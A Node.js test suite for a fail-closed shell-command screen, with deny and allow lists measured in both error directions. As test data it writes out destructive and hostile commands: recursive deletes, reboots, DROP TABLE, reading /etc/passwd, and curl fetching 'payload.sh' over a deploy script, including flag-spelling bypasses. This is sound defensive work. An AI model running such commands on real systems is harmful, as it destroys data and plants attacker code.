#!/usr/bin/env node
// Proof for the fail-closed screen — tooling/grip/screen.mjs.
//
//   node --test tooling/grip/test/screen.test.mjs
//
// WHY THIS SUITE IS SHAPED AROUND THREE NAMED SETS RATHER THAN AROUND THE CODE.
// A denylist authored WITH the full corpus in hand and a measurement harness
// already running still oscillated between false-safe and false-refusal across
// FOUR correction rounds. Every one of those broken drafts would have passed a
// suite that only asserted the behaviours its author was thinking about at the
// time. So the measurement is the deliverable:
//
//   DANGER SET          must be REFUSED   — admitting one is an outage
//   REGRESSION SET      must be ADMITTED  — refusing one punishes honest work
//   NEVER-CRY-WOLF SET  must be ADMITTED  — these LOOK dangerous and are not
//
// All three run after EVERY regex edit, in both error directions at once. Two
// real defects in this module were found that way and by auditing the ADMITTED
// side of the corpus (the side a refusal-focused review never reads):
//   • `bp cloud workspace export … --file default-a.tar` was ADMITTED — it
//     writes a tarball.
//   • `bp task get X -o json` was REFUSED once `-o` was read as an output file;
//     on bp it is the output FORMAT, and that draft cost 13 false refusals.
//
// HERMETIC. Nothing here executes a screened command; the screen is pure.

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

import {
  screenCommand, screenSegment, screenAll,
  hostBoundReason, maskQuotedSpans, metacharacterReason, splitSegments, tokenize,
  writeShapeReason, runNamedSets,
  ALLOWED_HEADS, REFUSED_HEADS, HOST_BOUND,
  DANGER_SET, REGRESSION_SET, NEVER_CRY_WOLF_SET,
} from "../screen.mjs";

const SCREEN_MJS = fileURLToPath(new URL("../screen.mjs", import.meta.url));
const CORPUS = fileURLToPath(new URL("../fixtures/evidence-corpus.json", import.meta.url));

// ── 1. THE MODULE CONTRACT ───────────────────────────────────────────────────

test("screenCommand returns {ok, reason} with a non-empty reason in both directions", () => {
  const admitted = screenCommand("git worktree list");
  const refused = screenCommand("reboot");
  for (const r of [admitted, refused]) {
    assert.equal(typeof r.ok, "boolean");
    assert.equal(typeof r.reason, "string");
    assert.ok(r.reason.length > 0, "a verdict with no reason is not a verdict");
  }
  assert.equal(admitted.ok, true);
  assert.equal(refused.ok, false);
});

test("screen.mjs imports NOTHING from rerun.mjs (D29: a denylist verdict must never be read as an allowlist verdict)", () => {
  const src = readFileSync(SCREEN_MJS, "utf8");
  const imports = [...src.matchAll(/^\s*import\s[^;]*?from\s+["']([^"']+)["']/gm)].map((m) => m[1]);
  assert.deepEqual(imports, [], `screen.mjs must be self-contained; found imports: ${imports.join(", ")}`);
  assert.ok(!/from\s+["'][^"']*rerun\.mjs/.test(src), "screen.mjs must not import rerun.mjs");
  // The two dynamic imports it does have are node: builtins, in the CLI only.
  const dynamic = [...src.matchAll(/await import\(["']([^"']+)["']\)/g)].map((m) => m[1]);
  assert.ok(dynamic.every((d) => d.startsWith("node:")), `dynamic imports must be node: builtins, got ${dynamic.join(", ")}`);
});

test("FAILS CLOSED: an unknown command head is REFUSED", () => {
  const r = screenCommand("some-novel-binary --do-a-thing");
  assert.equal(r.ok, false);
  assert.match(r.reason, /unknown command head "some-novel-binary"/);
  assert.match(r.reason, /fails CLOSED/i);
});

test("FAILS CLOSED: heads inherited from Object.prototype are not entries", () => {
  // Wave 2's review found the ten-verdict vocabulary leaking through
  // Object.prototype: a bare index on an object literal resolved `toString` and
  // `constructor` as if they were members, so the guard written to keep a set
  // closed was the one place it failed open. ALLOWED_HEADS is a Map.
  for (const head of ["toString", "constructor", "__proto__", "hasOwnProperty", "valueOf"]) {
    const r = screenCommand(`${head} --x`);
    assert.equal(r.ok, false, `${head} must not resolve as an allowlisted head`);
    assert.match(r.reason, /unknown command head|not allowlisted/);
  }
  assert.ok(ALLOWED_HEADS instanceof Map);
  assert.ok(REFUSED_HEADS instanceof Map);
});

test("empty, whitespace and unparsable commands are REFUSED, never admitted by default", () => {
  for (const c of ["", "   ", null, undefined]) {
    assert.equal(screenCommand(c).ok, false, `${JSON.stringify(c)} must be refused`);
  }
  const unterminated = screenCommand("grep -n 'unterminated file.txt");
  assert.equal(unterminated.ok, false);
  assert.match(unterminated.reason, /unterminated quote/);
});

// ── 2. LAYER (a) — THE HOST BOUND, AND ITS ORDER ─────────────────────────────

test("the host bound refuses every named host, verb and IP", () => {
  const cases = [
    ["ssh guerrilla 'systemctl status barkpark'", /ssh/],
    ["scp deploy.sh guerrilla:/opt/barkpark/", /scp|guerrilla/],
    ["rsync -av ./dist/ prod:/srv/", /rsync/],
    ["curl http://157.180.90.121/api/health", /157\.180\.90\.121/],
    ["curl http://178.105.92.191/api/health", /178\.105\.92\.191/],
    ["curl https://guerrilla.barkpark.cloud/v1/data", /guerrilla|barkpark\.cloud/],
    ["curl https://api.barkpark.cloud/v1/data", /barkpark\.cloud/],
    ["cat /home/root@host/notes", /root@/],
  ];
  for (const [cmd, why] of cases) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `must refuse: ${cmd}`);
    assert.match(r.reason, /^host bound:/, `must refuse at the HOST layer: ${cmd} → ${r.reason}`);
    assert.match(r.reason, why);
  }
  assert.equal(HOST_BOUND.length, 8, "eight host-bound patterns are ratified");
});

test("the host bound is checked BEFORE the allowlist — it beats an unknown head to the verdict", () => {
  // `some-novel-binary` alone is refused as an unknown head. Named with a prod
  // host it must be refused as a HOST violation, which is only possible if the
  // host layer runs first. That ordering is what protects the concurrent PDS
  // crown cycle measuring against the deployed build.
  assert.match(screenCommand("some-novel-binary --do-a-thing").reason, /unknown command head/);
  assert.match(screenCommand("some-novel-binary --host root@guerrilla").reason, /^host bound:/);
  // And it beats an otherwise perfectly ADMISSIBLE command.
  assert.equal(screenCommand("grep -rn 'x' notes.md").ok, true);
  assert.match(screenCommand("grep -rn 'x' guerrilla-notes.md").reason, /^host bound:/);
});

test("the host bound scans RAW — a hostname inside quotes is still refused (accepted over-refusal)", () => {
  // This is the one layer that gets no cleverness: its failure mode reaches
  // another machine. The cost is a handful of admissible reads.
  const r = screenCommand(`grep -n "guerrilla" README.md`);
  assert.equal(r.ok, false);
  assert.match(r.reason, /^host bound:/);
  assert.equal(hostBoundReason(`echo "ssh is mentioned here"`), "names ssh (remote execution)");
});

// ── 3. LAYER (b) — METACHARACTERS AND THE ALLOWLIST ──────────────────────────

test("shell metacharacters that turn one command into another are REFUSED", () => {
  const cases = [
    ["grep -rn x . $(rm -rf /tmp/y)", /command substitution/],
    ["grep -rn x `rm -rf /tmp/y`", /backticks/],
    ["diff <(cat a) <(cat b)", /process substitution/],
    ["grep x a.txt ; reboot", /command sequencing/],
    ["grep x a.txt > /tmp/out.txt", /output redirection/],
    ["grep x a.txt >> /tmp/out.txt", /output redirection/],
    ["cat < /etc/passwd", /input redirection/],
    ["( cd /tmp && reboot )", /subshell/],
    ["mix test &", /background job/],
    ["grep x a.txt\nreboot", /newline/],
  ];
  for (const [cmd, why] of cases) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `must refuse: ${cmd}`);
    assert.match(r.reason, why, `${cmd} → ${r.reason}`);
  }
});

test("the two DISCARDING redirections are admitted; every other redirection is not", () => {
  assert.equal(screenCommand("grep -c x a.txt 2>/dev/null").ok, true);
  assert.equal(screenCommand("mix test 2>&1").ok, true);
  assert.equal(screenCommand("go vet ./... >/dev/null 2>&1").ok, true);
  assert.equal(screenCommand("go vet ./... > vet.log").ok, false);
});

test("a metacharacter INSIDE quotes is data, not syntax — the honest-work case", () => {
  // rerun.mjs was refusing exactly these before it gained quote awareness, and a
  // gate that punishes honest work gets routed around within a wave (D3).
  for (const c of [
    `grep -n "a > b" README.md`,
    `grep -rn "npm publish instructions" docs/`,
    `git log --grep="publish flow"`,
    `grep -n "chmod 644 is required" docs/x.md`,
    `grep -c '^+def build(' api/lib/barkpark/content/errors.ex`,
  ]) {
    const r = screenCommand(c);
    assert.equal(r.ok, true, `must stay admitted: ${c} → ${r.reason}`);
  }
});

test("a pipeline is only as admissible as its LEAST admissible member", () => {
  assert.equal(screenCommand("git log --oneline | head -5").ok, true);
  assert.equal(screenCommand("cd /repo && grep -rn x .").ok, true);
  const r = screenCommand("git log --oneline | tee /tmp/log.txt");
  assert.equal(r.ok, false);
  assert.match(r.reason, /tee|pipeline segment/);
  const r2 = screenCommand("cd /repo && bash deploy/site-deploy.sh");
  assert.equal(r2.ok, false);
  assert.match(r2.reason, /bash/);
});

test("an environment-assignment prefix is stripped so the real head is screened", () => {
  // Without stripping, `MIX_ENV=test mix ecto.drop` presents `MIX_ENV=test` as
  // its head and never reaches the mix rule at all.
  assert.equal(screenCommand("MIX_ENV=test mix test").ok, true);
  assert.equal(screenCommand("CC=clang MIX_ENV=test mix test test/foo_test.exs").ok, true);
  const r = screenCommand("MIX_ENV=test mix ecto.drop");
  assert.equal(r.ok, false);
  assert.match(r.reason, /ecto\.drop/);
  assert.equal(screenCommand("FOO=bar").ok, false);
});

test("sub-verb rules refuse the mutating half of an allowlisted head", () => {
  const refused = [
    ["git fetch origin", /git fetch mutates \.git refs/],
    ["git pull --rebase", /not on the read-only allowlist/],
    ["git checkout main", /not on the read-only allowlist/],
    ["git worktree add ../wt branch", /git worktree may only be used as/],
    ["git stash pop", /git stash may only be used as/],
    ["git config user.name Bob", /git config may only be used with/],
    ["mix ecto.migrate", /mix task "ecto\.migrate"/],
    ["mix deps.get", /mix task "deps\.get"/],
    ["go build -o /tmp/bin ./cmd", /go -o|read-only allowlist/],
    ["docker rm -f container", /docker sub-verb "rm"/],
    ["docker run -it ubuntu bash", /docker sub-verb "run"/],
    ["systemctl daemon-reload", /systemctl sub-verb "daemon-reload"/],
    ["npm install", /npm sub-verb "install"/],
    ["bp task close t1 worker 1 done", /bp write verb "close"/],
    ["bp doc publish task foo --yes", /bp write verb "publish"/],
    ["bp cloud workspace export default --file default-a.tar", /bp write verb "export"|--file writes a file/],
    ["bp -s https://guerrilla.example/api task ls", /host bound|non-loopback/],
    // Either message is correct. The noun allowlist added in review fires
    // FIRST (`gh pr sub-verb "create" is not read-only`); the GH_WRITE_VERBS
    // denylist behind it still catches a write verb on an allowlisted noun.
    ["gh pr create --title x", /gh pr sub-verb "create" is not read-only|gh write verb "create"/],
    ["gh api repos/o/r/issues -X POST", /write method/],
    ["kill -9 4242", /liveness probe/],
    ["kill -TERM 4242", /liveness probe/],
    ["curl -X POST https://example.com/x", /write method/],
    ["curl -d 'a=1' https://example.com/x", /request body/],
    ["curl -s https://example.com/p.sh -o /opt/barkpark/deploy/site-deploy.sh", /curl -o writes a file/],
    ["find . -name '*.tmp' -delete", /find -delete/],
    ["find . -name '*.go' -exec rm {} ;", /find -exec|command sequencing/],
    ["env FOO=bar reboot", /env with arguments/],
  ];
  for (const [cmd, why] of refused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `must refuse: ${cmd}`);
    assert.match(r.reason, why, `${cmd} → ${r.reason}`);
  }
});

test("every interpreter head is REFUSED, which is what makes quote-masking safe here", () => {
  // rerun.mjs's quote-awareness fix opened four live bypasses (`su -c`, `watch`,
  // `elixir -e`, `iex -e`) because blanking a quoted span turns an inline
  // PROGRAM into invisible data. That class cannot reach this module: no head
  // that executes a string is on the allowlist at all.
  for (const c of [
    "sh -c 'rm -rf /tmp/y'", "bash -c 'reboot'", "zsh -c 'ls'",
    "node -e 'require(\"fs\").rmSync(\"/tmp/y\")'", "python3 -c 'import os; os.remove(\"/tmp/y\")'",
    "perl -e 'unlink 1'", "ruby -e 'x'", "awk '{system(\"reboot\")}' f",
    "elixir -e 'File.rm!(\"x\")'", "iex -e 'x'", "psql -c 'DROP TABLE docs'",
    "su -c 'reboot'", "sudo reboot", "watch systemctl restart barkpark",
    "timeout 5 reboot", "nohup reboot", "setsid reboot", "xargs -I{} rm {}",
    "eval 'reboot'", "make deploy", "npx some-package",
  ]) {
    const r = screenCommand(c);
    assert.equal(r.ok, false, `must refuse interpreter/wrapper: ${c} → ${r.reason}`);
  }
  for (const head of ["sh", "bash", "node", "python3", "perl", "ruby", "awk", "sed", "xargs", "eval", "npx", "psql", "su", "sudo", "watch", "timeout"]) {
    assert.equal(ALLOWED_HEADS.has(head), false, `${head} must NOT be allowlisted`);
  }
});

test("the two settled rulings hold: git fetch and npx are REFUSED", () => {
  assert.equal(screenCommand("git fetch origin").ok, false);
  assert.equal(screenCommand("git fetch --all --prune").ok, false);
  assert.match(screenCommand("git fetch origin").reason, /\.git refs in a checkout three live cycles share/);
  assert.equal(screenCommand("npx playwright test").ok, false);
  assert.match(screenCommand("npx playwright test").reason, /installs and then executes an arbitrary package/);
});

// ── 4. LAYER (c) — WRITE SHAPES AS SECOND-LAYER DEFENCE ──────────────────────

test("layer (c) catches cp — the verb rerun.mjs’s WRITE_SHAPES omits entirely", async () => {
  // rerun.mjs's filesystem rule is `(mkdir|touch|chmod|chown|ln)`. `cp` appears
  // NOWHERE in that module, and `cp` is the one verb that overwrites an
  // existing file with different content.
  const why = writeShapeReason("cp /tmp/evil.js api/lib/barkpark/application.ex");
  assert.ok(why, "cp must be a write shape");
  assert.match(why, /^cp \(overwrites a file/);
  // Proven BEHAVIOURALLY against the real rerun.mjs, not by reading its source
  // for the word "cp" — a first draft of this control did that and matched
  // `File.(…|cp|cp_r|…)`, an Elixir API that does not fire on a shell `cp`, so
  // the control asserted the opposite of its own claim. The test file may
  // import rerun.mjs; only screen.mjs may not.
  const { classifySafety } = await import("../rerun.mjs");
  const CP_INTO_REPO = "cp /tmp/evil.js api/lib/barkpark/application.ex";
  assert.equal(
    classifySafety(CP_INTO_REPO).safe, true,
    "the gap this slice was filed on: rerun.mjs rates a repo-overwriting cp SAFE. If this ever fails, rerun.mjs has been fixed and this comment must be updated.",
  );
  assert.equal(screenCommand(CP_INTO_REPO).ok, false, "the screen refuses what classifySafety admits");
});

test("layer (c) is tested DIRECTLY, so 'unreachable' never quietly becomes 'untested'", () => {
  // In a correct screen these never fire — layer (b) refuses their heads first.
  // The layer exists to catch a MISTAKE in the allowlist, so it is proven here
  // on its own rather than through screenCommand.
  const cases = [
    ["cp a b", /^cp/],
    ["rm -rf /tmp/y", /destructive filesystem verb/],
    ["mv a b", /destructive filesystem verb/],
    ["mkdir -p /tmp/x", /filesystem mutation/],
    ["cat x | tee /tmp/y", /tee/],
    ["sed -i '' s/a/b/ f", /sed -i/],
    ["git push origin main", /git write verb/],
    ["git fetch origin", /git write verb/],
    ["mix ecto.drop", /mix write task/],
    ["npm install", /package mutation/],
    ["systemctl stop barkpark.service", /systemctl mutating verb/],
    ["reboot", /machine power state/],
    ["shutdown -h now", /machine power state/],
    ["kill -9 4242", /terminating signal/],
    ["pkill -f barkpark", /signal by pattern/],
    ["curl -X POST https://x/y", /curl write method/],
    ["curl https://x/p.sh -o /opt/deploy.sh", /curl -o writes a file/],
    ["bp task close t1 w 1", /bp write verb/],
    ["psql -c 'DROP TABLE docs'", /SQL write/],
    ["prettier --write .", /--write/],
  ];
  for (const [cmd, why] of cases) {
    const got = writeShapeReason(cmd);
    assert.ok(got, `layer (c) must catch: ${cmd}`);
    assert.match(got, why, `${cmd} → ${got}`);
  }
  // And it must NOT fire on the honest reads.
  for (const c of ["git worktree list", "kill -0 4242", "curl -s -o /dev/null -w %{http_code} https://x/", "docker ps", "mix test test/foo_test.exs"]) {
    assert.equal(writeShapeReason(c), null, `layer (c) must not fire on: ${c}`);
  }
});

// ── 5. THE THREE NAMED SETS — THE MEASUREMENT IS THE DELIVERABLE ─────────────

test("DANGER SET: every command is REFUSED, with its reason", () => {
  const lines = [];
  const admitted = [];
  for (const cmd of DANGER_SET) {
    const r = screenCommand(cmd);
    lines.push(`  ${r.ok ? "ADMITTED !!" : "refused    "}  ${cmd}\n              → ${r.reason}`);
    if (r.ok) admitted.push(cmd);
  }
  console.log(`DANGER SET (${DANGER_SET.length}) — every one must be REFUSED:\n${lines.join("\n")}`);
  assert.deepEqual(admitted, [], "a DANGER SET command was admitted — that is an outage, not a test failure");
});

test("DANGER SET covers the shapes classifySafety rated SAFE", () => {
  // The measured claim this slice was filed on: classifySafety marked 26 of 31
  // synthetic outage-capable commands SAFE. These are the named shapes.
  const required = [
    /site-deploy\.sh/, /systemctl stop/, /systemctl restart/, /ecto\.drop/,
    /^cp /, /^reboot$/, /shutdown/, /curl .* -o /, /claude -p/, /kill -9/,
    /pkill/, /git fetch/, /npx/, /some-novel-binary/,
  ];
  for (const re of required) {
    assert.ok(DANGER_SET.some((c) => re.test(c)), `DANGER SET must carry a ${re} shape`);
  }
  assert.ok(DANGER_SET.filter((c) => /site-deploy\.sh/.test(c)).length >= 2, "both site-deploy.sh invocations");
});

test("REGRESSION SET: every command stays ADMITTED — 0 over-refusals", () => {
  const refused = [];
  for (const cmd of REGRESSION_SET) {
    const r = screenCommand(cmd);
    console.log(`  ${r.ok ? "admitted" : "REFUSED!"}  ${cmd}`);
    if (!r.ok) refused.push(`${cmd} → ${r.reason}`);
  }
  assert.deepEqual(refused, [], "a gate that punishes honest work gets routed around within a wave (D3)");
  // Named individually so a failure names the behaviour, not an index.
  assert.equal(screenCommand("grep -n 'template' deploy/site-deploy.sh").ok, true, "READING a deploy script is not RUNNING it");
  assert.equal(screenCommand("mix test test/barkpark/sites/deploy_runner_test.exs:583").ok, true, "a targeted mix test");
  assert.equal(screenCommand("git worktree list").ok, true, "git worktree LIST");
  assert.equal(screenCommand("command -v setsid").ok, true, "command -v of a refused head is still just a lookup");
});

test("NEVER-CRY-WOLF SET: the dangerous-LOOKING commands stay ADMITTED", () => {
  const refused = [];
  for (const cmd of NEVER_CRY_WOLF_SET) {
    const r = screenCommand(cmd);
    console.log(`  ${r.ok ? "admitted" : "REFUSED!"}  ${cmd}`);
    if (!r.ok) refused.push(`${cmd} → ${r.reason}`);
  }
  assert.deepEqual(refused, []);
  assert.equal(screenCommand("kill -0 4242").ok, true, "kill -0 signals nothing — it probes liveness");
  assert.equal(screenCommand("curl -s -o /dev/null -w %{http_code} https://x/").ok, true, "-o /dev/null discards, it does not write");
  assert.equal(screenCommand("systemctl is-active barkpark.service").ok, true, "is-active reads");
  assert.equal(screenCommand("docker ps").ok, true, "docker ps reads");
});

test("CONTROL (D18): the three sets can FAIL — an admit-everything screen fails all of them", () => {
  // A set that cannot fail proves nothing. Both directions are exercised: a
  // permissive screen must produce false PERMISSIONS, a paranoid one false
  // REFUSALS. Without this, a suite of green assertions over a broken screen
  // reads exactly like a suite of green assertions over a correct one.
  const admitAll = () => ({ ok: true, reason: "stub" });
  const refuseAll = () => ({ ok: false, reason: "stub" });

  const permissive = runNamedSets(admitAll);
  assert.equal(permissive.falsePermissions.length, DANGER_SET.length, "the DANGER SET must catch a fully permissive screen");
  assert.equal(permissive.falseRefusals.length, 0);

  const paranoid = runNamedSets(refuseAll);
  assert.equal(paranoid.falsePermissions.length, 0);
  assert.equal(paranoid.falseRefusals.length, REGRESSION_SET.length + NEVER_CRY_WOLF_SET.length, "the admit sets must catch a fully paranoid screen");

  const real = runNamedSets();
  assert.deepEqual(real.falsePermissions, []);
  assert.deepEqual(real.falseRefusals, []);
});

// ── 6. THE CENSUS'S HONEST REACH ─────────────────────────────────────────────

test("the admission rate over the frozen corpus is MEASURED and PRINTED", () => {
  const corpus = JSON.parse(readFileSync(CORPUS, "utf8"));
  const commands = corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim());
  const r = screenAll(commands);

  assert.equal(r.total, 651, "the frozen corpus carries 651 distinct proof commands");
  console.log(
    `\nCENSUS REACH — ${r.admitted}/${r.total} admitted = ${(r.rate * 100).toFixed(1)}% ` +
      `(${r.refused} refused)\n` +
      `  This is the census's honest reach over THESE 651 commands. A statistic later\n` +
      `  derived over the ${r.admitted} admitted commands describes that subset only — it may\n` +
      `  NEVER be restated as covering 651 commands.\n` +
      `  top refusal reasons:\n` +
      [...r.byReason].sort((a, b) => b[1] - a[1]).slice(0, 8).map(([w, n]) => `    ${String(n).padStart(4)}  ${w}`).join("\n"),
  );

  // A bound, not a frozen number: the rate is a property of the screen AND the
  // corpus, and pinning it exactly would make every honest allowlist widening
  // look like a regression. But a rate near 0 means the screen is useless and a
  // rate near 1 means it is not screening.
  assert.ok(r.rate > 0.15, `admission rate ${(r.rate * 100).toFixed(1)}% is so low the census cannot re-derive anything`);
  assert.ok(r.rate < 0.6, `admission rate ${(r.rate * 100).toFixed(1)}% is too high for a fail-closed screen over untrusted input`);
});

test("no corpus command is admitted while naming a bounded host — the layer (a) sweep", () => {
  const corpus = JSON.parse(readFileSync(CORPUS, "utf8"));
  const leaked = corpus.proofs
    .map((p) => p?.command)
    .filter((c) => typeof c === "string" && screenCommand(c).ok)
    .filter((c) => HOST_BOUND.some(([re]) => re.test(c)));
  assert.deepEqual(leaked, [], "a command naming a bounded host was admitted");
});

test("screenAll dedupes and never crashes on a hostile row", () => {
  const r = screenAll(["git status", "git status", null, undefined, 42, "", "   ", "reboot"]);
  assert.equal(r.total, 2, "duplicates and non-strings are dropped before screening");
  assert.equal(r.admitted, 1);
  assert.equal(r.refused, 1);
});

// ── 7. THE PARSER PRIMITIVES ─────────────────────────────────────────────────

test("maskQuotedSpans preserves offsets and returns null on an unterminated quote", () => {
  const cmd = `grep -n "a > b" f.md`;
  const masked = maskQuotedSpans(cmd);
  assert.equal(masked.length, cmd.length, "masking must be 1:1 so offsets still line up");
  assert.equal(masked.includes(">"), false, "the quoted redirect must be masked");
  assert.ok(masked.startsWith("grep -n "), "unquoted text must stay byte-identical");
  assert.equal(maskQuotedSpans(`grep -n "unterminated`), null);
  assert.equal(maskQuotedSpans(`grep -n 'unterminated`), null);
});

test("tokenize strips quotes and keeps a quoted span as ONE token", () => {
  assert.deepEqual(tokenize(`grep -n "a b" f.md`), ["grep", "-n", "a b", "f.md"]);
  assert.deepEqual(tokenize(`bp task get x -o json`), ["bp", "task", "get", "x", "-o", "json"]);
  assert.deepEqual(tokenize(""), []);
});

test("splitSegments splits on UNQUOTED separators only", () => {
  const raw = `git log | grep "a|b" && head -1`;
  assert.deepEqual(splitSegments(raw, maskQuotedSpans(raw)), ["git log", `grep "a|b"`, "head -1"]);
  const fd = `mix test 2>&1 | tail -5`;
  assert.deepEqual(splitSegments(fd, maskQuotedSpans(fd)), ["mix test 2>&1", "tail -5"]);
});

test("metacharacterReason and screenSegment are usable on their own", () => {
  assert.equal(metacharacterReason("grep x f"), null);
  assert.match(metacharacterReason("grep x f ; reboot"), /sequencing/);
  assert.equal(screenSegment("git worktree list"), null);
  assert.match(screenSegment("reboot"), /not allowlisted/);
});

// ── 8. THE SECOND-EXECUTION-PATH QUESTION (brief: harvest.mjs, 606 lines) ────

test("harvest.mjs holds ONE execution path and it runs a MODULE CONSTANT, not corpus input", () => {
  // Read in full for this slice. harvest.mjs DOES execute a child process —
  // `execFileSync("bash", ["-c", LIST_COMMAND])` at :78 — which a grep for
  // `spawnSync` misses entirely. But the string it runs is the module-level
  // LIST_COMMAND constant (:59-61), never a value from the corpus, a fact or a
  // caller. So it is NOT a second path for historical commands and does not
  // need this screen. This test pins that reading so the finding cannot rot.
  const src = readFileSync(fileURLToPath(new URL("../harvest.mjs", import.meta.url)), "utf8");
  const execs = [...src.matchAll(/\b(execFileSync|execSync|spawnSync|spawn|exec|fork)\s*\(/g)].map((m) => m[1]);
  assert.deepEqual(execs, ["execFileSync"], `harvest.mjs's execution surface changed: ${execs.join(", ")} — re-audit whether it now runs untrusted input`);
  assert.match(src, /execFileSync\("bash", \["-c", LIST_COMMAND\]/, "the one exec must still run the LIST_COMMAND constant");
  assert.match(src, /const LIST_COMMAND =\s*\n?\s*"find /, "LIST_COMMAND must remain a module-level literal");
});

// ── 9. FLAG-SPELLING BYPASSES (added in review) ──────────────────────────────
//
// Seven commands were ADMITTED by the first shipped draft. They share one root
// cause: the rules compared flag TOKENS exactly, while a shell accepts several
// spellings of the same flag. The sharpest is D29's own named danger with its
// short flags CLUSTERED — `-so <path>` rather than `-o <path>` — which walked
// past layer (b) AND layer (c), whose pattern also demanded a bare ` -o `.
//
// The lesson is about the instrument, not the regex: the DANGER SET carried the
// unclustered spelling only, so the measurement built to catch exactly this
// class could not see it. A named set measures the spellings it contains and
// nothing else. All seven now live in DANGER_SET, so the selftest carries them.

test("a flag spelled differently is the same flag — clustered, =-joined and long forms all refuse", () => {
  const bypasses = [
    ["curl -s https://example.com/payload.sh -so /opt/barkpark/deploy/site-deploy.sh", /curl -o writes a file/],
    ["curl -sO https://example.com/payload.sh", /writes a file/],
    ["curl -sJO https://example.com/x", /writes a file/],
    ["curl --output=/tmp/x https://example.com/x", /curl -o writes a file/],
    ["curl --request=POST https://example.com/x", /write method/],
    ["bp --server=https://example.com task ls", /non-loopback/],
    ["bp doc ls --output=/tmp/x", /writes a file/],
    ["gh repo clone barkpark/barkpark /tmp/x", /not read-only|write verb/],
    ["gh release download v1 --dir /tmp", /not read-only|write verb/],
    ["gh gist create x", /not on the read-only allowlist/],
    ["journalctl --vacuum-size=1M", /mutates or deletes the journal/],
    ["journalctl --rotate", /mutates or deletes the journal/],
    ["date -s 2020-01-01", /SETS the system clock/],
    ["date --set=2020-01-01", /SETS the system clock/],
  ];
  for (const [cmd, why] of bypasses) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
    assert.match(r.reason, why, `wrong reason for ${cmd}: ${r.reason}`);
  }
});

test("the cluster expander does not turn honest curl reads into false refusals", () => {
  // The cost of the fix, measured in the direction that punishes honest work.
  // `-s`, `-sS`, `-sL`, `-so /dev/null` and a `-w` format string clustered
  // behind `-s` are the corpus's ordinary read shapes.
  const honest = [
    "curl -s https://example.com/health",
    "curl -sS https://example.com/health",
    "curl -sL https://example.com/health",
    "curl -so /dev/null -w %{http_code} https://example.com/",
    "curl -s -o /dev/null -w %{http_code} https://example.com/",
    "gh api repos/o/r/branches/main/protection",
    "gh pr view 4159 --json state,mergedAt",
    "gh run list --workflow elixir.yml --limit 5",
    "journalctl -u barkpark --since '1 hour ago'",
    "date -u +%Y-%m-%dT%H:%M:%SZ",
  ];
  for (const cmd of honest) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
});

test("the fixes cost the census no reach — the admission rate is unchanged", () => {
  // The whole point of the cluster expander and the gh noun allowlist is that
  // they close holes WITHOUT narrowing the census. Measured over the same 651
  // frozen commands the module's own --census reports on: 240 admitted, before
  // and after. A reach collapse here would mean a fix bought safety with
  // cry-wolf, which the module's error-direction argument does not license.
  const corpus = JSON.parse(readFileSync(fileURLToPath(new URL("../fixtures/evidence-corpus.json", import.meta.url)), "utf8"));
  const commands = corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim());
  const r = screenAll(commands);
  assert.equal(r.total, 651);
  assert.equal(r.admitted, 240, "the review's flag-spelling fixes must not change what the census reaches");
});
